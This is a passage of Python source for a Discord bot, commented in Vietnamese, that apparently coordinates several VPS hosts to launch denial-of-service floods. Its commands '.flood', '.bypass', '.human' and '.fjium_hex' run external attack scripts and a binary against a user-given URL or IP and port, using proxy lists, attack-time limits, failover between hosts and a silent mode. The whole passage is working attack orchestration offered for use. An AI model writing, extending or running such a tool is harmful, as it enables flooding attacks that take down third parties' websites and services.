                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            # Chỉ xóa file cũ hơn 1 giờ
                            if os.path.getmtime(file_path) < (datetime.now().timestamp() - 3600):
                                os.remove(file_path)
                                cleaned_files += 1
                        except (OSError, PermissionError, FileNotFoundError):
                            pass
        
        return cleaned_files
    except Exception as e:
        logger.error(f"Lỗi khi dọn dẹp file tạm: {e}")
        return 0

def kill_zombie_processes():
    """Kill các process zombie"""
    try:
        killed_count = 0
        for proc in psutil.process_iter(['pid', 'name', 'status']):
            try:
                if proc.info['status'] == psutil.STATUS_ZOMBIE:
                    proc.kill()
                    killed_count += 1
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        return killed_count
    except Exception as e:
        logger.error(f"Lỗi khi kill zombie processes: {e}")
        return 0

def perform_system_optimization():
    """Tối ưu hóa toàn bộ hệ thống"""
    results = {
        "memory_cleaned": 0,
        "temp_files_cleaned": 0,
        "zombie_processes_killed": 0,
        "before_cpu": 0,
        "after_cpu": 0,
        "before_memory": 0,
        "after_memory": 0
    }
    
    # Lấy thông tin trước khi tối ưu
    before_info = get_system_info()
    if before_info:
        results["before_cpu"] = before_info["cpu_percent"]
        results["before_memory"] = before_info["memory_percent"]
    
    # Dọn dẹp bộ nhớ
    results["memory_cleaned"] = perform_memory_cleanup()
    
    # Dọn dẹp file tạm
    results["temp_files_cleaned"] = perform_temp_cleanup()
    
    # Kill zombie processes
    results["zombie_processes_killed"] = kill_zombie_processes()
    
    # Lấy thông tin sau khi tối ưu
    after_info = get_system_info()
    if after_info:
        results["after_cpu"] = after_info["cpu_percent"]
        results["after_memory"] = after_info["memory_percent"]
    
    return results

async def flood_countdown(ctx, total_time):
    """Hiển thị countdown thời gian flood"""
    global COUNTDOWN_ENABLED, COUNTDOWN_INTERVAL, COUNTDOWN_FINAL, is_running
    
    if not COUNTDOWN_ENABLED:
        return
        
    try:
        remaining_time = total_time
        last_update = 0
        
        while remaining_time > 0 and is_running:
            # Tính thời gian còn lại
            minutes = remaining_time // 60
            seconds = remaining_time % 60
            
            # Tạo progress bar
            if total_time > 0:
                progress = (total_time - remaining_time) / total_time
            else:
                progress = 0
            bar_length = 20
            filled_length = int(bar_length * progress)
            bar = "█" * filled_length + "░" * (bar_length - filled_length)
            
            # Tạo embed countdown
            embed = discord.Embed(
                title=f"⏱️ [{VPS_NAME}] Flood Countdown",
                description=f"**Thời gian còn lại:** {minutes:02d}:{seconds:02d}\n**Tiến độ:** {progress*100:.1f}%\n```{bar}```",
                color=discord.Color.blue()
            )
            
            # Thêm thông tin chi tiết
            embed.add_field(
                name="📊 Thông tin",
                value=f"**Tổng thời gian:** {total_time}s\n**Đã chạy:** {total_time - remaining_time}s\n**Còn lại:** {remaining_time}s",
                inline=True
            )
            
            # Thêm thời gian ước tính
            if remaining_time > 60:
                eta_minutes = remaining_time // 60
                eta_seconds = remaining_time % 60
                eta_text = f"{eta_minutes:02d}:{eta_seconds:02d}"
            else:
                eta_text = f"{remaining_time}s"
            
            embed.add_field(
                name="⏰ ETA",
                value=f"**Hoàn thành sau:** {eta_text}\n**Trạng thái:** {'🟢 Chạy' if is_running else '🔴 Dừng'}",
                inline=True
            )
            
            # Gửi countdown dựa trên cài đặt (giảm tần suất để tránh rate limit)
            should_send = False
            if remaining_time <= COUNTDOWN_FINAL:
                # Gửi mỗi 2 giây khi còn ít thời gian (thay vì mỗi giây)
                if remaining_time % 2 == 0:
                    should_send = True
            elif COUNTDOWN_INTERVAL > 0 and remaining_time % COUNTDOWN_INTERVAL == 0:
                # Gửi theo interval
                should_send = True
            elif remaining_time == total_time:
                # Gửi ngay khi bắt đầu
                should_send = True
            
            if should_send:
                await safe_send_message(ctx, embed, 0.5)  # Giảm delay xuống 0.5 giây
                last_update = remaining_time
            
            await asyncio.sleep(1)
            remaining_time -= 1
        
        # Thông báo hoàn thành
        if is_running:  # Chỉ thông báo nếu flood vẫn đang chạy
            embed = discord.Embed(
                title=f"✅ [{VPS_NAME}] Flood hoàn thành!",
                description=f"**Tổng thời gian:** {total_time}s\n**Trạng thái:** Hoàn thành thành công",
                color=discord.Color.green()
            )
            await safe_send_message(ctx, embed, 0.1)
        else:
            # Thông báo bị dừng
            elapsed_time = total_time - remaining_time
            embed = discord.Embed(
                title=f"⏹️ [{VPS_NAME}] Flood đã dừng!",
                description=f"**Thời gian đã chạy:** {elapsed_time}s\n**Trạng thái:** Đã dừng bởi người dùng",
                color=discord.Color.orange()
            )
            await safe_send_message(ctx, embed, 0.1)
            
    except Exception as e:
        logger.error(f"Lỗi trong flood countdown: {e}")

async def connection_monitor():
    """Monitor connection health and auto-reconnect if needed - Liên tục retry"""
    global CONNECTION_HEALTHY, CONNECTION_RETRY_COUNT, CONTINUOUS_RECONNECT
    
    while True:
        try:
            await asyncio.sleep(30)  # Check every 30 seconds for faster detection
            
            # Check connection health
            is_healthy = await check_connection_health()
            
            if not is_healthy:
                print(f"🔄 [{VPS_NAME}] Kết nối không ổn định - thử kết nối lại...")
                logger.warning("Kết nối không ổn định - thử kết nối lại...")
                
                # Try to reconnect continuously
                success = await reconnect_bot()
                if success:
                    print(f"✅ [{VPS_NAME}] Kết nối lại thành công!")
                    logger.info("Kết nối lại thành công!")
                else:
                    print(f"❌ [{VPS_NAME}] Kết nối lại thất bại - sẽ thử lại sau {RETRY_DELAY}s")
                    logger.error("Kết nối lại thất bại - sẽ thử lại sau {RETRY_DELAY}s")
            else:
                # Connection is healthy, reset retry count
                if CONNECTION_RETRY_COUNT > 0:
                    print(f"✅ [{VPS_NAME}] Kết nối ổn định - reset retry count")
                    logger.info("Kết nối ổn định - reset retry count")
                    CONNECTION_RETRY_COUNT = 0
            
        except Exception as e:
            logger.error(f"Lỗi trong connection monitor: {e}")
            await asyncio.sleep(5)  # Shorter sleep on error

async def heartbeat_monitor():
    """Monitor heartbeat của các VPS và tự động failover"""
    global RESPONSE_VPS, AUTO_FAILOVER, SILENT_MODE, VPS_LAST_HEARTBEAT, VPS_RESPONSE_TIMES
    
    while True:
        try:
            await asyncio.sleep(HEARTBEAT_INTERVAL)
            
            if not AUTO_FAILOVER:
                continue
            
            # Kiểm tra VPS chính có còn sống không
            if RESPONSE_VPS is not None and not is_vps_alive(RESPONSE_VPS):
                print(f"💀 [{VPS_NAME}] VPS chính {RESPONSE_VPS} đã die - tự động failover")
                logger.info(f"VPS chính {RESPONSE_VPS} đã die - tự động failover")
                
                # Chọn VPS backup
                backup_vps = select_backup_vps()
                RESPONSE_VPS = backup_vps
                
                if backup_vps == VPS_NAME:
                    if not MANUAL_SILENT_MODE:
                        SILENT_MODE = False
                    print(f"🎯 [{VPS_NAME}] Trở thành VPS chính mới sau failover")
                    logger.info("Trở thành VPS chính mới sau failover")
                else:
                    if not MANUAL_SILENT_MODE:
                        SILENT_MODE = True
                    print(f"🔇 [{VPS_NAME}] VPS chính mới: {backup_vps}")
                    logger.info(f"VPS chính mới: {backup_vps}")
            
            # Dọn dẹp VPS đã die khỏi danh sách
            current_time = datetime.now().timestamp()
            dead_vps = []
            for vps_name, last_heartbeat in VPS_LAST_HEARTBEAT.items():
                if (current_time - last_heartbeat) > VPS_TIMEOUT:
                    dead_vps.append(vps_name)
            
            for vps_name in dead_vps:
                del VPS_LAST_HEARTBEAT[vps_name]
                if vps_name in VPS_RESPONSE_TIMES:
                    del VPS_RESPONSE_TIMES[vps_name]
                print(f"🗑️ [{VPS_NAME}] Xóa VPS đã die: {vps_name}")
                logger.info(f"Xóa VPS đã die: {vps_name}")
                
        except Exception as e:
            logger.error(f"Lỗi trong heartbeat monitor: {e}")
            await asyncio.sleep(5)

@bot.event
async def on_ready():
    global CONNECTION_RETRY_COUNT, CONNECTION_HEALTHY
    
    print(f"✅ [{VPS_NAME}] Bot đã đăng nhập thành {bot.user}")
    print(f"✅ [{VPS_NAME}] Bot ID: {bot.user.id}")
    print(f"✅ [{VPS_NAME}] Guilds: {len(bot.guilds)}")
    logger.info(f"Bot đã đăng nhập thành {bot.user}")
    logger.info(f"Bot ID: {bot.user.id}")
    logger.info(f"Guilds: {len(bot.guilds)}")
    
    # Update connection status
    update_connection_status(True)
    CONNECTION_RETRY_COUNT = 0  # Reset retry count on successful connection
    
    # Khởi động queue processor
    if not is_processing_queue:
        asyncio.create_task(process_message_queue())
        print(f"🔄 [{VPS_NAME}] Queue processor đã khởi động")
        logger.info("Queue processor đã khởi động")
    
    # Khởi động connection monitor
    asyncio.create_task(connection_monitor())
    print(f"🔗 [{VPS_NAME}] Connection monitor đã khởi động")
    logger.info("Connection monitor đã khởi động")
    
    # Khởi động continuous reconnect loop
    asyncio.create_task(continuous_reconnect_loop())
    print(f"🔄 [{VPS_NAME}] Continuous reconnect loop đã khởi động")
    logger.info("Continuous reconnect loop đã khởi động")
    
    # Khởi động heartbeat monitor
    asyncio.create_task(heartbeat_monitor())
    print(f"💓 [{VPS_NAME}] Heartbeat monitor đã khởi động")
    logger.info("Heartbeat monitor đã khởi động")

@bot.event
async def on_connect():
    print(f"🔌 [{VPS_NAME}] Đang kết nối đến Discord...")
    logger.info("Đang kết nối đến Discord...")
    update_connection_status(True)

@bot.event
async def on_disconnect():
    print(f"❌ [{VPS_NAME}] Mất kết nối với Discord!")
    logger.warning("Mất kết nối với Discord!")
    update_connection_status(False)

@bot.event
async def on_error(event, *args, **kwargs):
    print(f"❌ [{VPS_NAME}] Lỗi: {event}")
    logger.error(f"Lỗi: {event}")
    update_connection_status(False)

# Event để log khi nhận lệnh
@bot.event
async def on_command(ctx):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_info = f"{ctx.author.name}#{ctx.author.discriminator}" if ctx.author.discriminator != '0' else ctx.author.name
    command_info = f"{ctx.command.name} {ctx.message.content.replace(ctx.prefix + ctx.command.name, '').strip()}"
    
    # Thông báo bằng tiếng Việt
    server_name = ctx.guild.name if ctx.guild else 'Tin nhắn riêng'
    channel_name = ctx.channel.name if hasattr(ctx.channel, 'name') else 'Tin nhắn riêng'
    
    log_message = f"📝 [{timestamp}] [{VPS_NAME}] Đã nhận lệnh: {command_info}"
    log_message += f"\n   👤 Người dùng: {user_info}"
    log_message += f"\n   🏠 Server: {server_name}"
    log_message += f"\n   💬 Kênh: {channel_name}"
    
    print(f"\n{log_message}")
    logger.info(f"[{timestamp}] Lệnh nhận được: {command_info} | Người dùng: {user_info} | Server: {server_name} | Channel: {channel_name}")

# Xử lý lỗi khi nhập lệnh sai
@bot.event
async def on_command_error(ctx, error):
    try:
        print(f"❌ [{VPS_NAME}] Lỗi command: {error}")
        logger.error(f"Lỗi command: {error}")
        
        # Tạo embed lỗi
        if isinstance(error, discord.ext.commands.CommandNotFound):
            embed = discord.Embed(
                description="❌ Lệnh không tồn tại! Sử dụng `.commands` để xem danh sách lệnh.",
                color=discord.Color.red()
            )
        elif isinstance(error, commands.MissingRequiredArgument):
            embed = discord.Embed(
                description="❌ Thiếu tham số! Vui lòng kiểm tra lại cú pháp lệnh.",
                color=discord.Color.red()
            )
        elif isinstance(error, commands.BadArgument):
            embed = discord.Embed(
                description="❌ Tham số không hợp lệ! Vui lòng kiểm tra lại kiểu dữ liệu.",
                color=discord.Color.red()
            )
        else:
            embed = discord.Embed(
                description=f"❌ Lỗi: {str(error)}",
                color=discord.Color.red()
            )
        
        # Gửi trực tiếp để tránh vòng lặp vô hạn
        try:
            await ctx.send(embed=embed)
        except Exception as send_error:
            print(f"❌ [{VPS_NAME}] Không thể gửi lỗi: {send_error}")
            logger.error(f"Không thể gửi lỗi: {send_error}")
            
    except Exception as e:
        print(f"❌ [{VPS_NAME}] Lỗi trong on_command_error: {e}")
        logger.error(f"Lỗi trong on_command_error: {e}")

# Lệnh chạy duma.js
@bot.command()
async def bypass(ctx, url: str, time: int):
    global is_running, current_process
    if is_running:
        embed = discord.Embed(
            description="⚠️ Bot đang bận, vui lòng chờ chạy xong hoặc sử dụng `.stop` để dừng.",
            color=discord.Color.orange()
        )
        await ctx.send(embed=embed)
        return

    is_running = True
    embed = discord.Embed(description=f"🚀 [{VPS_NAME}] Đang chạy bypass...", color=discord.Color.green())
    await ctx.send(embed=embed)

    command = f"node duma.js {url} {time}"
    current_process = await asyncio.create_subprocess_shell(
        command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    await current_process.communicate()
    is_running = False
    current_process = None

# Lệnh chạy human.js
@bot.command()
async def human(ctx, url: str, time: int):
    global is_running, current_process
    if is_running:
        embed = discord.Embed(
            description="⚠️ Bot đang bận, vui lòng chờ chạy xong hoặc sử dụng `.stop` để dừng.",
            color=discord.Color.orange()
        )
        await ctx.send(embed=embed)
        return

    is_running = True
    embed = discord.Embed(description=f"🚀 [{VPS_NAME}] Đang chạy human...", color=discord.Color.green())
    await ctx.send(embed=embed)

    # human.js cần 5 tham số:
    command = f"node human.js {url} {time} prox.txt 16 821"
    current_process = await asyncio.create_subprocess_shell(
        command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    await current_process.communicate()
    is_running = False
    current_process = None

# Lệnh chạy flood.js
@bot.command()
async def flood(ctx, method: str, host: str, time: int, rate: int, thread: int):
    global is_running, current_process
    
    if SILENT_MODE:
        silent_log(f"Nhận lệnh flood: {method} {host} {time}s {rate} {thread}")
    else:
        print(f"🔍 [{VPS_NAME}] Nhận lệnh flood: is_running={is_running}")
        logger.info(f"Nhận lệnh flood: is_running={is_running}")
    
    # Kiểm tra xem VPS này có nên phản hồi không (VPS phản hồi nhanh nhất)
    is_main_vps = await should_respond()
    
    # Kiểm tra rate limit (chỉ VPS chính)
    if is_main_vps:
        can_proceed, wait_time = check_rate_limit(ctx.author.id)
        if not can_proceed:
            embed = discord.Embed(
                description=f"⏰ [{VPS_NAME}] Vui lòng chờ {wait_time:.1f}s trước khi gửi lệnh tiếp theo!",
                color=discord.Color.orange()
            )
            await safe_send_message(ctx, embed, 0.1)
            return
    else:
        # VPS không phải chính, chỉ log và chạy lệnh im lặng
        silent_log(f"Nhận lệnh flood từ VPS khác: {method} {host} {time}s")
    
    # Validate tham số (chỉ VPS chính phản hồi lỗi)
    validation_errors = validate_attack_params(method, host, time, rate, thread)
    if validation_errors and is_main_vps:
        embed = discord.Embed(
            title=f"❌ [{VPS_NAME}] Lỗi tham số:",
            description="\n".join(f"• {error}" for error in validation_errors),
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    elif validation_errors:
        silent_log(f"Lỗi tham số: {validation_errors}")
        return
    
    if is_running and is_main_vps:
        embed = discord.Embed(
            description=f"⚠️ [{VPS_NAME}] Bot đang bận, vui lòng chờ chạy xong hoặc sử dụng `.stop` để dừng.",
            color=discord.Color.orange()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    elif is_running:
        silent_log("Bot đang bận, bỏ qua lệnh")
        return

    # Tối ưu hóa lệnh
    optimized_method, optimized_host, optimized_time, optimized_rate, optimized_thread = optimize_command(method, host, time, rate, thread)
    
    # Hiển thị thông tin tối ưu hóa (chỉ VPS chính)
    if is_main_vps and (optimized_time != time or optimized_rate != rate or optimized_thread != thread):
        embed = discord.Embed(
            title=f"⚡ [{VPS_NAME}] Tối ưu hóa lệnh:",
            description=f"**Thời gian:** {time}s → {optimized_time}s\n**Rate:** {rate} → {optimized_rate}\n**Threads:** {thread} → {optimized_thread}",
            color=discord.Color.yellow()
        )
        await safe_send_message(ctx, embed, 0.1)

    is_running = True
    if SILENT_MODE:
        silent_log(f"Bắt đầu chạy flood: {optimized_method} {optimized_host} {optimized_time}s")
    else:
        print(f"🚀 [{VPS_NAME}] Bắt đầu chạy flood...")
        logger.info("Bắt đầu chạy flood...")
    
    # Chỉ VPS chính phản hồi
    if is_main_vps:
        embed = discord.Embed(description=f"🚀 [{VPS_NAME}] Đang chạy flood...", color=discord.Color.green())
        await safe_send_message(ctx, embed, 0.1)
        
        # Khởi động countdown task
        asyncio.create_task(flood_countdown(ctx, optimized_time))

    # flood.js với các tham số đã tối ưu
    command = f"node flood.js {optimized_method} {optimized_host} {optimized_time} {optimized_rate} {optimized_thread} proxies.txt --query 1 --cookie \"uh=good\" --http 2 --debug --full --winter"
    print(f"🔧 [{VPS_NAME}] Lệnh: {command}")
    logger.info(f"Lệnh: {command}")
    
    try:
        current_process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        print(f"⚡ [{VPS_NAME}] Process đã tạo, đang chạy...")
        logger.info("Process đã tạo, đang chạy...")
        
        # Kiểm tra process health sau 5 giây
        await asyncio.sleep(5)
        if current_process.returncode is not None:
            print(f"❌ [{VPS_NAME}] Process đã dừng sớm sau 5s (returncode={current_process.returncode})")
            logger.error(f"Process đã dừng sớm sau 5s (returncode={current_process.returncode})")
            if SILENT_MODE:
                silent_log(f"Flood thất bại: Process dừng sớm")
            else:
                print(f"❌ [{VPS_NAME}] Flood thất bại - Process dừng sớm!")
                logger.error("Flood thất bại - Process dừng sớm!")
            update_stats(success=False, duration=5)
            return
        
        print(f"✅ [{VPS_NAME}] Process vẫn chạy sau 5s - tiếp tục...")
        logger.info("Process vẫn chạy sau 5s - tiếp tục...")
        
        # Chạy process với timeout đúng thời gian yêu cầu
        try:
            # Đợi process hoàn thành hoặc timeout
            stdout, stderr = await asyncio.wait_for(
                current_process.communicate(), 
                timeout=optimized_time + 15  # Thêm 15s buffer để đảm bảo
            )
            
            # Process hoàn thành sớm - đây có thể là vấn đề
            if current_process.returncode == 0:
                print(f"⚠️ [{VPS_NAME}] Process hoàn thành sớm (returncode=0) - có thể flood.js có vấn đề")
                logger.warning("Process hoàn thành sớm - có thể flood.js có vấn đề")
            elif current_process.returncode is not None:
                print(f"❌ [{VPS_NAME}] Process lỗi (returncode={current_process.returncode})")
                logger.error(f"Process lỗi (returncode={current_process.returncode})")
            
            if stdout:
                print(f"📤 [{VPS_NAME}] stdout: {stdout.decode()[:200]}...")
                logger.info(f"stdout: {stdout.decode()[:200]}...")
            if stderr:
                print(f"❌ [{VPS_NAME}] stderr: {stderr.decode()[:200]}...")
                logger.error(f"stderr: {stderr.decode()[:200]}...")
                
            if SILENT_MODE:
                silent_log(f"Flood hoàn thành sớm: {optimized_time}s")
            else:
                print(f"✅ [{VPS_NAME}] Flood hoàn thành!")
                logger.info("Flood hoàn thành!")
            update_stats(success=True, duration=optimized_time)
            
        except asyncio.TimeoutError:
            # Timeout - đây là trường hợp bình thường khi flood chạy đúng thời gian
            print(f"⏰ [{VPS_NAME}] Flood timeout sau {optimized_time}s - đây là bình thường")
            logger.info(f"Flood timeout sau {optimized_time}s - đây là bình thường")
            
            # Kill process để đảm bảo dừng
            if current_process.returncode is None:
                try:
                    current_process.kill()
                    await asyncio.wait_for(current_process.wait(), timeout=5)
                except (ProcessLookupError, asyncio.TimeoutError):
                    print(f"⚠️ [{VPS_NAME}] Không thể kill process - có thể đã dừng")
                    logger.warning("Không thể kill process - có thể đã dừng")
            
            if SILENT_MODE:
                silent_log(f"Flood hoàn thành: {optimized_time}s")
            else:
                print(f"✅ [{VPS_NAME}] Flood hoàn thành!")
                logger.info("Flood hoàn thành!")
            update_stats(success=True, duration=optimized_time)
        
    except Exception as e:
        if SILENT_MODE:
            silent_log(f"Lỗi khi chạy flood: {e}")
        else:
            print(f"❌ [{VPS_NAME}] Lỗi khi chạy flood: {e}")
            logger.error(f"Lỗi khi chạy flood: {e}")
        update_stats(success=False, duration=0)
    finally:
        # Đảm bảo cleanup hoàn toàn
        is_running = False
        
        # Cleanup process một cách an toàn
        if current_process:
            try:
                # Kiểm tra process còn chạy không
                if current_process.returncode is None:
                    print(f"🔄 [{VPS_NAME}] Process vẫn chạy - đang terminate...")
                    current_process.terminate()
                    
                    # Đợi process dừng trong 3 giây
                    try:
                        await asyncio.wait_for(current_process.wait(), timeout=3)
                        print(f"✅ [{VPS_NAME}] Process đã dừng gracefully")
                    except asyncio.TimeoutError:
                        # Nếu không dừng được, force kill
                        print(f"⚠️ [{VPS_NAME}] Process không dừng - force kill...")
                        current_process.kill()
                        try:
                            await asyncio.wait_for(current_process.wait(), timeout=2)
                        except asyncio.TimeoutError:
                            print(f"❌ [{VPS_NAME}] Không thể kill process - bỏ qua")
            except (ProcessLookupError, AttributeError) as e:
                print(f"⚠️ [{VPS_NAME}] Lỗi cleanup process: {e}")
                logger.warning(f"Lỗi cleanup process: {e}")
        
        current_process = None
        
        if SILENT_MODE:
            silent_log("Reset trạng thái: is_running=False")
        else:
            print(f"🔄 [{VPS_NAME}] Reset trạng thái: is_running=False")
            logger.info("Reset trạng thái: is_running=False")

# Lệnh chạy fjium-hex
@bot.command()
async def fjium_hex(ctx, ip: str, port: int, time: int):
    """Chạy file fjium-hex với tham số ip port time"""
    global is_running, current_process
    
    if SILENT_MODE:
        silent_log(f"Nhận lệnh fjium-hex: {ip}:{port} {time}s")
    else:
        print(f"🔍 [{VPS_NAME}] Nhận lệnh fjium-hex: is_running={is_running}")
        logger.info(f"Nhận lệnh fjium-hex: is_running={is_running}")
    
    # Kiểm tra xem VPS này có nên phản hồi không (VPS phản hồi nhanh nhất)
    is_main_vps = await should_respond()
    
    # Kiểm tra rate limit (chỉ VPS chính)
    if is_main_vps:
        can_proceed, wait_time = check_rate_limit(ctx.author.id)
        if not can_proceed:
            embed = discord.Embed(
                description=f"⏰ [{VPS_NAME}] Vui lòng chờ {wait_time:.1f}s trước khi gửi lệnh tiếp theo!",
                color=discord.Color.orange()
            )
            await safe_send_message(ctx, embed, 0.1)
            return
    else:
        # VPS không phải chính, chỉ log và chạy lệnh im lặng
        silent_log(f"Nhận lệnh fjium-hex từ VPS khác: {ip}:{port} {time}s")
    
    # Validate tham số (chỉ VPS chính phản hồi lỗi)
    if time <= 0 or time > MAX_ATTACK_TIME:
        error_msg = f"Thời gian phải từ 1-{MAX_ATTACK_TIME}s"
        if is_main_vps:
            embed = discord.Embed(
                title=f"❌ [{VPS_NAME}] Lỗi tham số:",
                description=f"• {error_msg}",
                color=discord.Color.red()
            )
            await safe_send_message(ctx, embed, 0.1)
            return
        else:
            silent_log(f"Lỗi tham số: {error_msg}")
            return
    
    if port <= 0 or port > 65535:
        error_msg = "Port phải từ 1-65535"
        if is_main_vps:
            embed = discord.Embed(
                title=f"❌ [{VPS_NAME}] Lỗi tham số:",
                description=f"• {error_msg}",
                color=discord.Color.red()
            )
            await safe_send_message(ctx, embed, 0.1)
            return
        else:
            silent_log(f"Lỗi tham số: {error_msg}")
            return
    
    if is_running and is_main_vps:
        embed = discord.Embed(
            description=f"⚠️ [{VPS_NAME}] Bot đang bận, vui lòng chờ chạy xong hoặc sử dụng `.stop` để dừng.",
            color=discord.Color.orange()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    elif is_running:
        silent_log("Bot đang bận, bỏ qua lệnh")
        return
    
    # Kiểm tra file fjium-hex có tồn tại không
    if not os.path.exists('./fjium-hex'):
        if is_main_vps:
            embed = discord.Embed(
                description=f"❌ [{VPS_NAME}] File fjium-hex không tồn tại!",
                color=discord.Color.red()
            )
            await safe_send_message(ctx, embed, 0.1)
            return
        else:
            silent_log("File fjium-hex không tồn tại")
            return
    
    # Cấp quyền thực thi cho file fjium-hex
    try:
        if platform.system() != "Windows":
            # Kiểm tra quyền thực thi trên Linux/Mac
            check_process = await asyncio.create_subprocess_shell(
                "test -x fjium-hex",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await check_process.communicate()
            
            if check_process.returncode != 0:
                # Cấp quyền thực thi
                chmod_process = await asyncio.create_subprocess_shell(
                    "chmod +x fjium-hex",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                await chmod_process.communicate()
                
                if is_main_vps:
                    embed = discord.Embed(
                        description=f"🔧 [{VPS_NAME}] Đã cấp quyền thực thi cho fjium-hex!",
                        color=discord.Color.blue()
                    )
                    await safe_send_message(ctx, embed, 0.1)
                else:
                    silent_log("Đã cấp quyền thực thi cho fjium-hex")
    except Exception as e:
        if is_main_vps:
            print(f"⚠️ [{VPS_NAME}] Lỗi cấp quyền thực thi: {e}")
        else:
            silent_log(f"Lỗi cấp quyền thực thi: {e}")
    
    # Bắt đầu chạy lệnh
    is_running = True
    
    if is_main_vps:
        embed = discord.Embed(
            description=f"🚀 [{VPS_NAME}] Đang chạy fjium-hex {ip}:{port} {time}s...",
            color=discord.Color.green()
        )
        await safe_send_message(ctx, embed, 0.1)
    
    try:
        # Chạy lệnh fjium-hex
        command = f"./fjium-hex {ip} {port} {time}"
        current_process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        if is_main_vps:
            print(f"🚀 [{VPS_NAME}] Chạy fjium-hex: {command}")
            logger.info(f"Chạy fjium-hex: {command}")
        else:
            silent_log(f"Chạy fjium-hex: {command}")
        
        # Chờ process hoàn thành
        await current_process.communicate()
        
    except Exception as e:
        if is_main_vps:
            print(f"❌ [{VPS_NAME}] Lỗi chạy fjium-hex: {e}")
            logger.error(f"Lỗi chạy fjium-hex: {e}")
        else:
            silent_log(f"Lỗi chạy fjium-hex: {e}")
    finally:
        # Reset trạng thái
        is_running = False
        if current_process:
            try:
                if current_process.returncode is None:
                    current_process.terminate()
                    await asyncio.sleep(1)
                    if current_process.returncode is None:
                        current_process.kill()
            except (ProcessLookupError, AttributeError):
                pass
        current_process = None
        
        if is_main_vps:
            embed = discord.Embed(
                description=f"✅ [{VPS_NAME}] fjium-hex hoàn thành!",
                color=discord.Color.green()
            )
            await safe_send_message(ctx, embed, 0.1)
        
        if SILENT_MODE:
            silent_log("Reset trạng thái: is_running=False")
        else:
            print(f"🔄 [{VPS_NAME}] Reset trạng thái: is_running=False")
            logger.info("Reset trạng thái: is_running=False")

# Lệnh dừng lệnh đang chạy - NHANH VÀ TRIỆT ĐỂ
@bot.command()
async def stop(ctx):
    """Dừng tất cả process đang chạy - GỘP stop, force_stop, kill"""
    global is_running, current_process
    
    # Kiểm tra xem VPS này có nên phản hồi không
    is_main_vps = await should_respond()
    if not is_main_vps:
        silent_log("Nhận lệnh stop từ VPS khác")
        return
    
    if not is_running:
        embed = discord.Embed(
            description=f"❌ [{VPS_NAME}] Không có lệnh nào đang chạy!",
            color=discord.Color.red()
        )
        await safe_send_message(ctx, embed, 0.1)
        return
    
    # DỪNG NGAY LẬP TỨC - MẠNH MẼ NHẤT (GỘP TẤT CẢ CHỨC NĂNG)
    print(f"💀 [{VPS_NAME}] STOP NGAY LẬP TỨC - MẠNH MẼ NHẤT!")
    logger.info("STOP NGAY LẬP TỨC - MẠNH MẼ NHẤT!")
    
    # Reset trạng thái NGAY LẬP TỨC
    is_running = False
    
    # KILL TẤT CẢ PROCESS NGAY LẬP TỨC (GỘP TẤT CẢ CHỨC NĂNG)
    try:
        if platform.system() == "Windows":
            # Kill tất cả node.exe
            os.system("taskkill /f /im node.exe 2>nul")
            # Kill các file cụ thể
            os.system("taskkill /f /im flood.js 2>nul")
            os.system("taskkill /f /im duma.js 2>nul")
            os.system("taskkill /f /im human.js 2>nul")
            # Kill fjium-hex process
            os.system("taskkill /f /im fjium-hex.exe 2>nul")
            os.system("taskkill /f /im fjium-hex 2>nul")
        else:
            # Kill tất cả process node với pkill -9 (mạnh mẽ nhất)
            os.system("pkill -9 -f 'node.*flood.js' 2>/dev/null")
            os.system("pkill -9 -f 'node.*duma.js' 2>/dev/null")
            os.system("pkill -9 -f 'node.*human.js' 2>/dev/null")
            os.system("pkill -9 -f 'node' 2>/dev/null")
            # Kill fjium-hex process
            os.system("pkill -9 -f 'fjium-hex' 2>/dev/null")
            os.system("pkill -9 -f './fjium-hex' 2>/dev/null")
    except:
        pass
    
    # Force cleanup current_process
    if current_process:
        try:
            current_process.kill()
        except:
            pass
        current_process = None
    
    # Thông báo đã dừng
    embed = discord.Embed(
        description=f"💀 [{VPS_NAME}] ĐÃ STOP TẤT CẢ PROCESS!",
        color=discord.Color.red()
    )
    await safe_send_message(ctx, embed, 0.1)
    
    print(f"💀 [{VPS_NAME}] STOP HOÀN TẤT!")
    logger.info("STOP HOÀN TẤT!")



# Lệnh hiển thị danh sách lệnh
@bot.command()
async def status(ctx):
    """Kiểm tra trạng thái VPS hiện tại"""
    embed = discord.Embed(
        title=f"📊 Trạng thái VPS",
        description=f"**VPS Name:** {VPS_NAME}\n**Bot ID:** {bot.user.id}\n**Guilds:** {len(bot.guilds)}\n**Status:** {'🟢 Online' if not bot.is_closed() else '🔴 Offline'}",
        color=discord.Color.green() if not bot.is_closed() else discord.Color.red()
    )
    embed.add_field(
        name="🔧 Thông tin kỹ thuật",
        value=f"**Hostname:** {socket.gethostname()}\n**Port:** {VPS_PORT}\n**Python:** {sys.version.split()[0]}",
        inline=False
    )
    embed.add_field(
        name="🔇 Chế độ im lặng",
        value=f"**Trạng thái:** {'🔇 Bật' if SILENT_MODE else '🔊 Tắt'}\n**Mô tả:** {'Bot chạy lệnh nhưng không gửi tin nhắn' if SILENT_MODE else 'Bot gửi tin nhắn phản hồi bình thường'}",
        inline=False
    )
    await ctx.send(embed=embed)

@bot.command()
async def limits(ctx):
    """Hiển thị giới hạn hiện tại"""
    embed = discord.Embed(
        title=f"⚙️ [{VPS_NAME}] Giới hạn hệ thống",
        color=discord.Color.blue()
    )
    
    embed.add_field(
        name="🚫 Giới hạn tấn công",
        value=f"**Thời gian tối đa:** {MAX_ATTACK_TIME}s\n**Rate tối đa:** {MAX_RATE}\n**Threads tối đa:** {MAX_THREADS}",
        inline=False
    )
    
    embed.add_field(
        name="⏰ Rate Limiting",
